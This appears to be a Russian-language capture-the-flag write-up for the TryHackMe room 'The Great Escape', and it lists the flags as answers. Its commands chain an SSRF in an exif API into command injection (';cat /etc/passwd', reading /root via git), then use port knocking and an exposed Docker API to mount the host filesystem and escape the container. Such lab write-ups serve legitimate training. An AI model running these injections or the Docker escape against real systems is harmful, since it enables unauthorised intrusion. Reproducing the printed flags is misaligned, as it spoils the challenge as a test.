[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [The Great Escape](https://tryhackme.com/r/room/thegreatescape) 

Всего 4 задания:
## Задание 1
Если вы застряли на этапе Docker Breakout этого испытания, воспользуйтесь комнатой « Docker Rodeo », чтобы узнать о 
широком спектре уязвимостей Docker.

### Ответьте на вопросы ниже
Развертывание виртуальной машины
```commandline
Ответ не нужен
```

## Задание 2
Начните с простого веб-приложения. Сможете ли вы найти скрытый флаг?
### Ответьте на вопросы ниже
Найдите флаг, спрятанный в веб-приложении
```commandline
nmap -sSCV -p- <IP>
gobuster dir -f -u http://<IP> -w /usr/share/wordlists/dirb/big.txt
curl http://<IP>/.well-known/security.txt
curl -I http://<IP>//api/fl46
```
```commandline
THM{b801135794bf1ed3a2aafaa44c2e5ad4}
```

## Задание 3
На одной из машин есть скрытый root-ом флаг. Сможете его найти?

### Ответьте на вопросы ниже
Нашли корневой флаг?
```commandline
curl http://<IP>/robots.txt
http://<IP>/exif-util

http://<IP>/api/exif?url=http://api-dev-backup:8080
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;cat /etc/passwd
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;ls ~
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;cat ~/dev-note.txt
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;ls -la /root
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;git -C /root log
http://<IP>/api/exif?url=http://api-dev-backup:8080/exif?url=;git -C /root show a3d30a7d0510dc6565ff9316e3fb84434916dee8
```
```commandline
THM{0cb4b947043cb5c0486a454b75a10876}
```

## Задание 4
Вы думали, что у вас есть root. Но root в контейнере docker не так уж и полезен. Найдите секретный флаг
### Ответьте на вопросы ниже
Найдите настоящий корневой флаг
```commandline
cd /opt
sudo git clone https://github.com/grongor/knock.git
cd knock
./knock <IP> 42 1337 10420 6969 63000
nmap <IP> -p 2375
sudo nano /etc/docker/daemon.json
sudo systemctl stop docker
sudo systemctl start docker
docker -H <IP>:2375 images
docker -H <IP>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
cat /etc/passwd
exit
docker -H <IP>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash
cd /root
ls
cat flag.txt
```
```commandline
THM{c62517c0cad93ac93a92b1315a32d734}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)